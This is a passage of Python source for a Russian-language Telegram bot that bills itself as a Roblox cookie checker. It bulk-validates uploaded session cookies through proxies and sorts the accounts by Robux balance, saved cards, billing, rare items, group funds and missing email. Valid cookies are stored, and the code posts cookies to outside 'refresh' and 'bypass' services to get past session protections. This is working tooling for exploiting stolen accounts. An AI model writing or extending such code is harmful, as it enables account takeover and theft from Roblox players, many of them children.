                is_game_check = 'game_name' in file_info
                
                if is_game_check:
                    # Проверка для конкретной игры
                    game_name = file_info.get('game_name')
                    badges = file_info.get('game_badges', [])
                    gamepasses = file_info.get('game_gamepasses', [])
                    # Используем параметры только для выбранной игры
                    check_params = DEFAULT_CHECK_PARAMS.copy()
                    check_params['badges'] = len(badges) > 0
                    check_params['gamepasses'] = len(gamepasses) > 0
                else:
                    # Обычная проверка со всеми игры
                    badges = config.get('badges', [])
                    gamepasses = config.get('gamepasses', [])
                    check_params = config.get('check_params', DEFAULT_CHECK_PARAMS.copy())
                    game_name = None
                
                game_settings = config.get('game_settings', DEFAULT_GAME_SETTINGS.copy())
                playtime_settings = config.get('playtime_settings', DEFAULT_PLAYTIME_SETTINGS.copy())
                
                stats = {
                    'valid': 0,
                    'invalid': 0,
                    'duplicates': file_info.get('duplicates', 0),
                    'total_balance': 0,
                    'total_donate': 0,
                    'total_all_time_donate': 0,
                    'total_pending': 0,
                    'total_rap': 0,
                    'total_billing': defaultdict(float),
                    'premium': 0,
                    'total_cards': 0,
                    'badges_found': 0,
                    'gamepasses_found': 0,
                    'total_group_balance': 0,
                    'total_place_visits': 0,
                    'total_game_donations': defaultdict(int),
                    'total_playtime': defaultdict(int),
                    'countries': defaultdict(int),
                    'valid_list': [],
                    'balance_list': [],
                    'cards_list': [],
                    'all_time_donate_list': [],
                    'badges_list': [],
                    'gamepasses_list': [],
                    'pending_list': [],
                    'nomail_list': [],
                    'rap_list': [],
                    'rare_items_list': [],
                    'group_balance_list': [],
                    'place_visits_list': [],
                    'game_donations_list': [],
                    'playtime_list': []
                }
                
                await bot.send_sticker(user_id, STICKERS['check_start'])
                
                # Разные сообщения для разных типов проверки
                if is_game_check:
                    status_message = (
                        f"🔍 <b>НАЧАЛО ПРОВЕРКИ ИГРЫ</b>\n"
                        f"\n"
                        f"🎮 <b>Игра:</b> <code>{game_name}</code>\n"
                        f"<b>Всего куки:</b> <code>{len(file_info['cookies']):,}</code>\n"
                        f"<b>Дубликатов удалено:</b> <code>{file_info.get('duplicates', 0)}</code>\n"
                        f"<b>Используется прокси:</b> <code>{len(proxies) if proxies else 'Нет'}</code>\n"
                        f"🏅 <b>Бейджей для проверки:</b> <code>{len(badges)}</code>\n"
                        f"🎮 <b>Геймпассов для проверки:</b> <code>{len(gamepasses)}</code>\n\n"
                        f"<b>Проверка началась...</b>"
                    )
                else:
                    status_message = (
                        f"🔍 <b>НАЧАЛО ПРОВЕРКИ КУКИ</b>\n"
                        f"\n"
                        f"<b>Всего куки:</b> <code>{len(file_info['cookies']):,}</code>\n"
                        f"<b>Дубликатов удалено:</b> <code>{file_info.get('duplicates', 0)}</code>\n"
                        f"<b>Используется прокси:</b> <code>{len(proxies) if proxies else 'Нет'}</code>\n"
                        f"<b>Параметров проверки:</b> <code>{sum(1 for v in check_params.values() if v)}</code>\n"
                        f"<b>Игр для проверки:</b> <code>{sum(1 for v in playtime_settings.values() if v)}</code>\n\n"
                        f"<b>Проверка началась...</b>"
                    )
                
                await message.edit_text(status_message, parse_mode=ParseMode.HTML)
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for cookie in file_info['cookies']:
                        if is_game_check:
                            # Для проверки игры используем check_game_cookie_with_retry с поддержкой retry
                            task = asyncio.create_task(
                                check_game_cookie_with_retry(session, cookie, game_name, badges, gamepasses, proxies)
                            )
                        else:
                            # Для обычной проверки используем check_cookie_with_retry
                            task = asyncio.create_task(
                                check_cookie_with_retry(session, cookie, badges, gamepasses, proxies, user_id)
                            )
                        tasks.append(task)
                        active_tasks.add(task)
                    
                    for i, future in enumerate(asyncio.as_completed(tasks)):
                        try:
                            result = await future
                            
                            if (i+1) % max(len(file_info['cookies'])//10, 10) == 0 or (i+1) == len(file_info['cookies']):
                                progress = (i+1)/len(file_info['cookies'])*100
                                await message.edit_text(
                                    f"🔍 <b>ПРОВЕРКА В ПРОЦЕССЕ</b>\n"
                                    f"\n"
                                    f"📊 <b>Прогресс:</b> <code>{i+1:,}</code>/<code>{len(file_info['cookies']):,}</code> (<code>{progress:.1f}%</code>)\n"
                                    f"✅ <b>Валидных:</b> <code>{stats['valid']:,}</code>\n"
                                    f"❌ <b>Невалидных:</b> <code>{stats['invalid']:,}</code>\n\n"
                                    f"⏳ <i>Пожалуйста, подождите...</i>",
                                    parse_mode=ParseMode.HTML
                                )
                            
                            if result['status'] == 'valid':
                                stats['valid'] += 1
                                
                                if is_game_check:
                                    # Обработка результатов для игра-специфичной проверки
                                    if result.get('badges_found'):
                                        stats['badges_found'] += len(result['badges_found'])
                                        stats['badges_list'].append(result)
                                    
                                    if result.get('gamepasses_found'):
                                        stats['gamepasses_found'] += len(result['gamepasses_found'])
                                        stats['gamepasses_list'].append(result)
                                    
                                    # Добавляем в список валидных кук для игры
                                    stats['valid_list'].append(result)
                                else:
                                    # Обработка результатов для обычной проверки
                                    if check_params.get('balance', True):
                                        stats['total_balance'] += result['balance']
                                        if result['balance'] > 0:
                                            stats['balance_list'].append(result)
                                    
                                    if check_params.get('pending', True):
                                        stats['total_pending'] += result['pending']
                                        if result['pending'] > 0:
                                            stats['pending_list'].append(result)
                                    
                                    if check_params.get('donate_year', True):
                                        stats['total_donate'] += result['donate']
                                    
                                    if check_params.get('donate_all_time', True):
                                        stats['total_all_time_donate'] += result['all_time_donate']
                                        if int(result['all_time_donate']) > 0:
                                            stats['all_time_donate_list'].append(result)
                                    
                                    if check_params.get('rap', True):
                                        stats['total_rap'] += result['rap']
                                        if result['rap'] > 0:
                                            stats['rap_list'].append(result)
                                    
                                    if check_params.get('billing', True):
                                        billing = result.get('billing', 'error')
                                        if billing != 'error':
                                            try:
                                                amount, currency = billing.split()
                                                stats['total_billing'][currency] += float(amount)
                                            except Exception as e:
                                                logging.error(f"Ошибка обработки биллинга: {e}")
                                    
                                    if check_params.get('premium', True):
                                        if result['premium']:
                                            stats['premium'] += 1
                                    
                                    if check_params.get('cards', True):
                                        if result['card']:
                                            stats['total_cards'] += 1
                                            stats['cards_list'].append(result)
                                    
                                    if check_params.get('badges', True):
                                        if result['badges']:
                                            badges_count = len(result['badges'].split(', '))
                                            stats['badges_found'] += badges_count
                                            stats['badges_list'].append(result)
                                    
                                    if check_params.get('gamepasses', True):
                                        if result['gamepasses']:
                                            gamepasses_count = len(result['gamepasses'].split(', '))
                                            stats['gamepasses_found'] += gamepasses_count
                                            stats['gamepasses_list'].append(result)
                                    
                                    if check_params.get('email', True):
                                        if not result['email']:
                                            stats['nomail_list'].append(result)
                                    
                                    if check_params.get('rare_items', True):
                                        if result['rare_items']:
                                            stats['rare_items_list'].append(result)
                                    
                                    if check_params.get('group_balance', True):
                                        stats['total_group_balance'] += result.get('group_balance', 0)
                                        if result.get('group_balance', 0) > 0:
                                            stats['group_balance_list'].append(result)
                                    
                                    if check_params.get('place_visits', True):
                                        stats['total_place_visits'] += result.get('place_visits', 0)
                                        if result.get('place_visits', 0) > 0:
                                            stats['place_visits_list'].append(result)
                                    
                                    if check_params.get('ingame_donate', True):
                                        game_donations = result.get('game_donations', {})
                                        for gm_name, amount in game_donations.items():
                                            stats['total_game_donations'][gm_name] += amount
                                        
                                        if any(amount > 0 for amount in game_donations.values()):
                                            stats['game_donations_list'].append(result)
                                    
                                    if check_params.get('playtime', True):
                                        playtime = result.get('playtime', {})
                                        for gm_name, time_played in playtime.items():
                                            stats['total_playtime'][gm_name] += time_played
                                        
                                        if any(time_played > 0 for time_played in playtime.values()):
                                            stats['playtime_list'].append(result)
                                    
                                    if check_params.get('country', True):
                                        country = result.get('country', 'Unknown')
                                        stats['countries'][country] += 1
                                    
                                    stats['valid_list'].append(result)
                                    
                                    valid_cookies = set()
                                    if os.path.exists('all_valid_cookies.txt'):
                                        with open('all_valid_cookies.txt', 'r', encoding='utf-8') as f:
                                            valid_cookies.update(line.strip() for line in f if line.strip())
                                    
                                    if result['cookie'] not in valid_cookies:
                                        with open('all_valid_cookies.txt', 'a', encoding='utf-8') as f:
                                            f.write(result['cookie'] + '\n')
                                
                                if result['cookie'] not in valid_cookies:
                                    with open('all_valid_cookies.txt', 'a', encoding='utf-8') as f:
                                        f.write(result['cookie'] + '\n')
                            else:
                                stats['invalid'] += 1
                        except asyncio.CancelledError:
                            logging.info(f"Проверка куки отменена для пользователя {user_id}")
                            await bot.send_sticker(user_id, STICKERS['error'])
                            await message.edit_text(
                                f"❌ <b>ПРОВЕРКА ОТМЕНЕНА</b>\n"
                                f"\n"
                                f"<i>Все текущие проверки были остановлены администратором.</i>",
                                parse_mode=ParseMode.HTML
                            )
                            break
                        except Exception as e:
                            logging.error(f"Ошибка при проверке куки: {e}")
                            stats['invalid'] += 1
                        finally:
                            if future in active_tasks:
                                active_tasks.remove(future)
                
                if stats['valid'] > 0:
                    if is_game_check:
                        # Для игра-специфичной проверки показываем специальный отчет
                        await generate_game_check_report(stats, user_id, message, start_time, game_name)
                    else:
                        # Для обычной проверки используем стандартный отчет
                        await generate_report(stats, user_id, message, start_time, check_params)
                else:
                    await bot.send_sticker(user_id, STICKERS['error'])
                    await message.edit_text(
                        f"❌ <b>ПРОВЕРКА ЗАВЕРШЕНА</b>\n"
                        f"\n"
                        f"🚫 <b>В файле не найдено валидных куки.</b>\n\n"
                        f"<i>Проверьте формат файла и попробуйте снова.</i>",
                        parse_mode=ParseMode.HTML
                    )
                
            except asyncio.CancelledError:
                await bot.send_sticker(user_id, STICKERS['error'])
                await message.edit_text(
                    f"❌ <b>ПРОВЕРКА ОТМЕНЕНА</b>\n"
                    f"\n"
                    f"<i>Все текущие проверки были остановлены администратором.</i>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                await bot.send_sticker(user_id, STICKERS['error'])
                await message.edit_text(
                    f"❌ <b>ОШИБКА ОБРАБОТКИ</b>\n"
                    f"\n"
                    f"<code>{str(e)}</code>",
                    parse_mode=ParseMode.HTML
                )
                logging.error(f"Ошибка обработки куки: {e}")
            finally:
                current_checking = None
                queue_status.pop(user_id, None)
                sent_queue_notifications.pop(user_id, None)
                await notify_queue_update()
        
        await asyncio.sleep(1)

async def notify_queue_update():
    global sent_queue_notifications
    
    temp_queue = list(check_queue.queue)
    current_positions = {}
    
    for idx, (user_id, _, _) in enumerate(temp_queue, start=1):
        current_positions[user_id] = idx
    
    for user_id in list(sent_queue_notifications.keys()):
        if user_id not in current_positions:
            sent_queue_notifications.pop(user_id, None)
    
    for user_id, position in current_positions.items():
        last_notified_position = sent_queue_notifications.get(user_id, 0)
        
        if (position != last_notified_position or 
            user_id not in sent_queue_notifications or
            position == 1):
            
            try:
                msg = (
                        f"⏳ <b>ВАША ОЧЕРЕДЬ</b>\n"
                        f"✨ <b>Ваш файл в очереди на проверку!</b>\n\n"
                        f"📍 <b>Позиция:</b> <code>{position}</code>\n"
                        f"<b>Время ожидания:</b> <code>{position * 2}-{position * 5}</code> минут\n\n"
                        f"<i>Статус обновляется автоматически.</i>"
                )
                
                await bot.send_message(
                    chat_id=user_id,
                    text=msg,
                    parse_mode=ParseMode.HTML
                )
                
                sent_queue_notifications[user_id] = position
                
            except Exception as e:
                logging.error(f"Ошибка уведомления пользователя {user_id}: {e}")
                sent_queue_notifications.pop(user_id, None)

async def notify_validator_queue_update():
    global validator_sent_notifications
    
    temp_queue = list(validator_queue.queue)
    current_positions = {}
    
    for idx, (user_id, _, _) in enumerate(temp_queue, start=1):
        current_positions[user_id] = idx
    
    for user_id in list(validator_sent_notifications.keys()):
        if user_id not in current_positions:
            validator_sent_notifications.pop(user_id, None)
    
    for user_id, position in current_positions.items():
        last_notified_position = validator_sent_notifications.get(user_id, 0)
        
        if (position != last_notified_position or 
            user_id not in validator_sent_notifications or
            position == 1):
            
            try:
                if position == 1:
                    msg = (
                        f"🎯 <b>ВАША ОЧЕРЕДЬ В ВАЛИДАТОРЕ</b>\n"
                        f"\n"
                        f"✨ <b>Ваш файл следующий в очереди на проверку!</b>\n\n"
                        f"<i>Начинаем проверку в ближайшие секунды...</i>"
                    )
                else:
                    msg = (
                        f"⏳ <b>ВАША ОЧЕРЕДЬ В ВАЛИДАТОРЕ</b>\n"
                        f"\n"
                        f"📍 <b>Позиция:</b> <code>{position}</code>\n"
                        f"⏱ <b>Время ожидания:</b> <code>{position * 2}-{position * 5}</code> минут\n\n"
                        f"<i>Статус обновляется автоматически.</i>"
                    )
                
                await bot.send_message(
                    chat_id=user_id,
                    text=msg,
                    parse_mode=ParseMode.HTML
                )
                
                validator_sent_notifications[user_id] = position
                
            except Exception as e:
                logging.error(f"Ошибка уведомления пользователя {user_id} в валидаторе: {e}")
                validator_sent_notifications.pop(user_id, None)

async def process_validator_queue():
    global current_validator_checking, validator_active_tasks
    while True:
        if not validator_queue.empty() and current_validator_checking is None:
            current_validator_checking = validator_queue.get()
            user_id, file_info, message = current_validator_checking
            start_time = time.time()
            
            try:
                proxies = Database.load_proxies()
                
                stats = {
                    'valid': 0,
                    'invalid': 0,
                    'duplicates': file_info.get('duplicates', 0),
                    'valid_cookies': []
                }
                
                await message.edit_text(
                    f"🔍 <b>НАЧАЛО ПРОВЕРКИ В ВАЛИДАТОРЕ</b>\n"
                    f"\n"
                    f"📂 <b>Всего куки:</b> <code>{len(file_info['cookies']):,}</code>\n"
                    f"🔄 <b>Дубликатов удалено:</b> <code>{file_info.get('duplicates', 0)}</code>\n"
                    f"🔗 <b>Используется прокси:</b> <code>{len(proxies) if proxies else 'Нет'}</code>\n\n"
                    f"⏳ <b>Проверка началась...</b>",
                    parse_mode=ParseMode.HTML
                )
                
                async with aiohttp.ClientSession() as session:
                    tasks = []
                    for cookie in file_info['cookies']:
                        task = asyncio.create_task(
                            check_cookie_simple(session, cookie, proxies)
                        )
                        tasks.append(task)
                        validator_active_tasks.add(task)
                    
                    for i, future in enumerate(asyncio.as_completed(tasks)):
                        try:
                            result = await future
                            
                            if (i+1) % max(len(file_info['cookies'])//10, 10) == 0 or (i+1) == len(file_info['cookies']):
                                progress = (i+1)/len(file_info['cookies'])*100
                                await message.edit_text(
                                    f"🔍 <b>ПРОВЕРКА В ПРОЦЕССЕ</b>\n"
                                    f"\n"
                                    f"📊 <b>Прогресс:</b> <code>{i+1:,}</code>/<code>{len(file_info['cookies']):,}</code> (<code>{progress:.1f}%</code>)\n"
                                    f"✅ <b>Валидных:</b> <code>{stats['valid']:,}</code>\n"
                                    f"❌ <b>Невалидных:</b> <code>{stats['invalid']:,}</code>\n\n"
                                    f"⏳ <i>Пожалуйста, подождите...</i>",
                                    parse_mode=ParseMode.HTML
                                )
                            
                            if result['status'] == 'valid':
                                stats['valid'] += 1
                                stats['valid_cookies'].append(result['cookie'])
                            else:
                                stats['invalid'] += 1
                        except asyncio.CancelledError:
                            logging.info(f"Проверка в валидаторе отменена для пользователя {user_id}")
                            await bot.send_sticker(user_id, STICKERS['error'])
                            await message.edit_text(
                                f"❌ <b>ПРОВЕРКА ОТМЕНЕНА</b>\n"
                                f"══════════════════════════",
                                parse_mode=ParseMode.HTML
                            )
                            break
                        except Exception as e:
                            logging.error(f"Ошибка при проверке куки в валидаторе: {e}")
                            stats['invalid'] += 1
                        finally:
                            if future in validator_active_tasks:
                                validator_active_tasks.remove(future)
                       
                
                if stats['valid'] > 0:
                    
                    valid_file_path = f"{COOKIE_FILES_DIR}Valid.txt"
                    with open(valid_file_path, 'w') as f:
                        f.write('\n'.join(stats['valid_cookies']))
                    
                    
                    await bot.send_sticker(user_id, STICKERS['success'])
                    result_text = (
                        f"✅ <b>РЕЗУЛЬТАТ ПРОВЕРКИ КУКОВ</b>\n"
                        f"\n"
                        f"✅ <b>Валидные:</b> <code>{stats['valid']:,}</code>\n"
                        f"❌ <b>Невалидные:</b> <code>{stats['invalid']:,}</code>\n"
                        f"🔄 <b>Дубликатов:</b> <code>{stats['duplicates']}</code>\n\n"
                        f"✨ <i>Проверка успешно завершена</i>"
                    )
                    
                    await message.answer_document(
                        document=FSInputFile(valid_file_path),
                        caption=result_text,
                        parse_mode=ParseMode.HTML
                    )
                    
                    
                    if os.path.exists(valid_file_path):
                        os.remove(valid_file_path)
                    
                else:
                    await bot.send_sticker(user_id, STICKERS['error'])
                    await message.edit_text(
                        f"❌ <b>ПРОВЕРКА ЗАВЕРШЕНА</b>\n"
                        f"\n"
                        f"🚫 <b>В файле не найдено валидных куков.</b>\n\n"
                        f"<i>Проверьте формат файла и попробуйте снова.</i>",
                        parse_mode=ParseMode.HTML
                    )
                
            except asyncio.CancelledError:
                await bot.send_sticker(user_id, STICKERS['error'])
                await message.edit_text(
                    f"❌ <b>ПРОВЕРКА ОТМЕНЕНА</b>\n"
                    f"══════════════════════════",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                await bot.send_sticker(user_id, STICKERS['error'])
                await message.edit_text(
                    f"❌ <b>ОШИБКА ОБРАБОТКИ</b>\n"
                    f"\n"
                    f"<code>{str(e)}</code>",
                    parse_mode=ParseMode.HTML
                )
                logging.error(f"Ошибка обработки куки в валидаторе: {e}")
            finally:
                current_validator_checking = None
                validator_queue_status.pop(user_id, None)
                validator_sent_notifications.pop(user_id, None)
        
        await asyncio.sleep(1)

async def mass_refresh_cookies(cookies_list):
    refreshed_cookies = []
    failed_cookies = []
    
    REFRESH_API_URL = "https://www.rblxrefresh.net/refresh"
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for cookie in cookies_list:
            task = asyncio.create_task(refresh_single_cookie(session, cookie, REFRESH_API_URL))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            cookie = cookies_list[i]
            if isinstance(result, Exception):
                failed_cookies.append({
                    'cookie': cookie,
                    'error': str(result)
                })
            elif result and result != "Invalid cookie format.":
                refreshed_cookies.append(result)
            else:
                failed_cookies.append({
                    'cookie': cookie,
                    'error': result if result else "Неизвестная ошибка"
                })
    
    return {
        'refreshed': refreshed_cookies,
        'failed': failed_cookies,
        'total': len(cookies_list),
        'success': len(refreshed_cookies),
        'failed_count': len(failed_cookies)
    }

async def refresh_single_cookie(session, cookie, api_url):
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        data = {
            "cookie": cookie
        }
        
        async with session.post(
            api_url,
            json=data,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as response:
            response_text = await response.text()
            
            if response.status == 200:
                if "Invalid cookie format" in response_text:
                    return "Invalid cookie format."
                else:
                    
                    return response_text.strip()
            else:
                return f"HTTP error! status: {response.status}"
                
    except asyncio.TimeoutError:
        return "Timeout error"
    except Exception as e:
        return str(e)

async def mass_bypass_cookies(cookies_list):
    bypassed_cookies = []
    failed_cookies = []
    
    BYPASS_API_URL = "https://rblxbypasser.com/api/bypass"
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for cookie in cookies_list:
            task = asyncio.create_task(bypass_single_cookie(session, cookie, BYPASS_API_URL))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            cookie = cookies_list[i]
            if isinstance(result, Exception):
                failed_cookies.append({
                    'cookie': cookie,
                    'error': str(result)
                })
            elif isinstance(result, dict) and result.get('success') == True:
                bypassed_cookies.append(result.get('cookie', cookie))
            else:
                error_msg = result.get('message', 'Неизвестная ошибка') if isinstance(result, dict) else str(result)
                failed_cookies.append({
                    'cookie': cookie,
                    'error': error_msg
                })
    
    return {
        'bypassed': bypassed_cookies,
        'failed': failed_cookies,
        'total': len(cookies_list),
        'success': len(bypassed_cookies),
        'failed_count': len(failed_cookies)
    }

async def bypass_single_cookie(session, cookie, api_url):
    try:
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        data = {
            "cookie": cookie
        }
        
        async with session.post(
            api_url,
            json=data,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as response:
            response_text = await response.text()
            
            if response.status == 200:
                try:
                    result = json.loads(response_text)
                    return result
                except json.JSONDecodeError:
                    return {"success": False, "message": response_text}
            else:
                return {"success": False, "message": f"HTTP error! status: {response.status}"}
                
    except asyncio.TimeoutError:
        return {"success": False, "message": "Timeout error"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Cookie Check"), KeyboardButton(text="Check Game")],
            [KeyboardButton(text="Profile"), KeyboardButton(text="Sorter")],
            [KeyboardButton(text="Valid Checker"), KeyboardButton(text="Cookie Refresh")],
            [KeyboardButton(text="Cookie Bypass"), KeyboardButton(text="Cookie Splitter")]
        ],
        resize_keyboard=True,
        one_time_keyboard=False
    )

@router.message(Command("restart"))
async def restart_bot(message: Message):
    if message.from_user.id not in ADMINS:
        await message.answer("❌ <b>У вас нет прав для выполнения этой команды</b>", parse_mode=ParseMode.HTML)
        return
    
    try:
        await message.answer("🔄 <b>Останавливаю все текущие проверки...</b>", parse_mode=ParseMode.HTML)
        
        global check_queue, current_checking, active_tasks, queue_task
        global validator_queue, current_validator_checking, validator_active_tasks, validator_task
        
        
        with check_queue.mutex:
            check_queue.queue.clear()
        with validator_queue.mutex:
            validator_queue.queue.clear()
        
        
        if current_checking:
            _, _, msg = current_checking
            try:
                await msg.edit_text("❌ <b>Проверка отменена администратором</b>", parse_mode=ParseMode.HTML)
            except Exception as e:
                logging.error(f"Ошибка редактирования сообщения: {e}")
            current_checking = None

        if current_validator_checking:
            _, _, msg = current_validator_checking
            try:
                await msg.edit_text("❌ <b>Проверка отменена администратором</b>", parse_mode=ParseMode.HTML)
            except Exception as e:
                logging.error(f"Ошибка редактирования сообщения валидатора: {e}")
            current_validator_checking = None

        
        tasks_to_cancel = list(active_tasks) + list(validator_active_tasks)
        for task in tasks_to_cancel:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logging.error(f"Ошибка при отмене задачи: {e}")
        active_tasks.clear()
        validator_active_tasks.clear()

        
        queue_status.clear()
        sent_queue_notifications.clear()
        validator_queue_status.clear()
        validator_sent_notifications.clear()

        
        queue_task = asyncio.create_task(process_queue())
        active_tasks.add(queue_task)
        
        validator_task = asyncio.create_task(process_validator_queue())
        validator_active_tasks.add(validator_task)

        
        users_to_notify = set(queue_status.keys()).union(set(validator_queue_status.keys()))
        for user_id in users_to_notify:
            try:
                await bot.send_sticker(user_id, STICKERS['error'])
                await bot.send_message(
                    user_id,
                    f"🔄 <b>ПРОВЕРКИ ОСТАНОВЛЕНЫ</b>\n"
                    f"\n"
                    f"<i>Все текущие проверки были остановлены администратором.</i>\n\n"
                    f"<b>Вы можете отправить файл с печеньками заново для проверки.</b>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                logging.error(f"Не удалось уведомить пользователя {user_id}: {e}")

        await message.answer("✅ <b>Все проверки успешно остановлены. Очереди очищены.</b>", parse_mode=ParseMode.HTML)
        
    except Exception as e:
        logging.error(f"Ошибка при остановке проверок: {e}")
        await message.answer(f"❌ <b>Ошибка остановки проверок:</b>\n<code>{str(e)}</code>", parse_mode=ParseMode.HTML)

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    user_id = message.from_user.id
    
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await bot.send_sticker(user_id, STICKERS['ban'])
        await message.answer(
            f"🚫 <b>ВЫ ЗАБЛОКИРОВАНЫ</b>\n"
            f"📝 <b>Причина блокировки:</b>\n<code>{reason}</code>\n\n",
            parse_mode=ParseMode.HTML
        )
        return
    
    await state.clear()
    _, is_new = Database.register_user(user_id, message.from_user.username)
    
    # Обработка реферального кода
    args = message.text.split()
    if len(args) > 1 and is_new:
        referral_code = args[1].upper()
        referrer_id = Database.get_user_by_referral_code(referral_code)
        if referrer_id and referrer_id != user_id:
            try:
                Database.register_referral(referrer_id, user_id)
                await bot.send_message(
                    referrer_id,
                    f"✨ <b>НОВЫЙ РЕФЕРАЛ</b>\n\n"
                    f"👤 Пользователь активировал вашу реф ссылку!\n"
                    f"🎁 Вы получили <code>3 бонусных проверки</code>\n\n"
                    f"📊 <b>Статистика:</b>\n"
                    f"├ Всего рефералов: <code>{Database.get_user_config(referrer_id).get('referral_count', 0)}</code>\n"
                    f"└ Бонусных проверок: <code>{Database.get_user_config(referrer_id).get('bonus_checks', 0)}</code>",
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                logging.error(f"Ошибка обработки реф кода: {e}")
    
    if is_new:
        for admin_id in ADMINS:
            try:
                await bot.send_message(
                    admin_id,
                    f'✨ <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>\n\n'
                    f'👤 ID: <code>{user_id}</code>\n'
                    f'📝 Username: @{message.from_user.username or "юзера нема"}',
                    parse_mode=ParseMode.HTML
                )
            except Exception as e:
                logging.error(f"Ошибка отправки уведомления админу {admin_id}: {e}")
    
    try:
        await bot.send_sticker(message.chat.id, STICKERS['welcome'])
        await bot.send_photo(
                chat_id=message.chat.id,
                photo="https://raw.githubusercontent.com/jealleal/images/refs/heads/main/Welcome.png",
                caption=(
                    f"✨ <b>Добро пожаловать, @{message.from_user.username}!</b>\n\n"
                    
                    f"<b>{BOT_NAME}</b> — чекер куки Roblox\n\n"
                    
                    f"🚀 <b>Основные возможности:</b>\n"
                    f"├ Полная статистика аккаунта\n"
                    f"├ Проверка куки на валидность\n"
                    f"├ Массовый рефреш куков\n"
                    f"├ Массовый байпас куков\n"
                    f"└ Быстрая массовая проверка\n\n"
                    
                    f"💎 <i>Выберите действие в меню ниже</i>"
                ),
                parse_mode=ParseMode.HTML,
                reply_markup=get_main_keyboard()
        )
    except Exception as e:
        logging.error(f"Ошибка отправки welcome.png: {e}")
        await bot.send_sticker(message.chat.id, STICKERS['welcome'])
        await message.answer(
            f"✨ <b>Добро пожаловать, @{message.from_user.username}!</b>\n\n"
            f"<b>{BOT_NAME}</b> — профессиональный чекер куки Roblox",
            parse_mode=ParseMode.HTML,
            reply_markup=get_main_keyboard(),
            disable_web_page_preview=True
        )
    
    await log_to_admin("Запустил бота", message.from_user.id, message.from_user.username)


@router.message(Command("ref"))
async def cmd_referral(message: Message):
    user_id = message.from_user.id
    
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    # Генерируем реф код если его ещё нет
    ref_code = Database.get_or_create_referral_code(user_id)
    config = Database.get_user_config(user_id)
    
    # Получаем статистику
    referral_count = config.get('referral_count', 0)
    bonus_checks = config.get('bonus_checks', 0)
    
    # Строим реф ссылку
    bot_username = (await bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={ref_code}"
    
    message_text = (
        f"🎁 <b>РЕФЕРАЛЬНАЯ ПРОГРАММА</b>\n\n"
        f"📨 <b>Ваша реф ссылка:</b>\n"
        f"<code>{ref_link}</code>\n\n"
        f"📊 <b>Статистика:</b>\n"
        f"├ 👥 Приглашено: <code>{referral_count}</code>\n"
        f"├ 🎫 Бонусных проверок: <code>{bonus_checks}</code>\n"
        f"└ 🎯 Код: <code>{ref_code}</code>\n\n"
        f"💰 <b>Награды:</b>\n"
        f"├ +3 бонусных проверки за каждого реферала\n"
        f"└ +1 бонусная проверка реферу при регистрации\n\n"
        f"<i>Нажмите на кнопку ниже чтобы скопировать ссылку</i>"
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Скопировать ссылку", url=ref_link)],
        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_menu")]
    ])
    
    await message.answer(message_text, parse_mode=ParseMode.HTML, reply_markup=keyboard)


@router.message(F.text == "Cookie Check")
async def cookie_check_menu(message: Message):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    config = Database.get_user_config(user_id)
    
    keyboard_rows = []

    keyboard_rows.append([InlineKeyboardButton(text="⚙️ Настройки чека", callback_data="check_settings_menu")])
    
    keyboard_rows.append([InlineKeyboardButton(text="📁 Проверить файл", callback_data="start_check_file")])
    keyboard_rows.append([InlineKeyboardButton(text="📝 Проверить сообщение", callback_data="start_check_message")])
    keyboard_rows.append([
        InlineKeyboardButton(text="🏅 Указать бэйджи", callback_data="set_badge"),
        InlineKeyboardButton(text="🎮 Указать геймпассы", callback_data="set_gp")
    ])
    keyboard_rows.append([InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_cookie_check")])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
    
    await message.answer(
        f"🔍 <b>Cookie Checker</b>\n"
        f"Выберите, что сканировать:\n\n"
        f"<i>Нажмите на параметр чтобы включить/выключить</i>\n"
        f"══════════════════════════",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.message(F.text == "Check Game")
async def check_game_menu_handler(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"🚫 Вы заблокированы. Причина: {reason}")
        return
    
    await state.set_state(Form.select_game)
    
    # Получаем список игр
    games_list = [
        'NinetyNineNightsintheForest', 'AUniversalTime', 'AdoptMe', 'AnimeAdventures', 'AnimeDefenders',
        'AnimeVanguards', 'BedWars', 'BeeSwarmSimulator', 'BladeBall', 'BloxFruits', 'BlueLockRivals',
        'BubbleGumSimulatorINFINITY', 'CreaturesofSonaria', 'DaHood', 'DragonAdventures', 'Fisch',
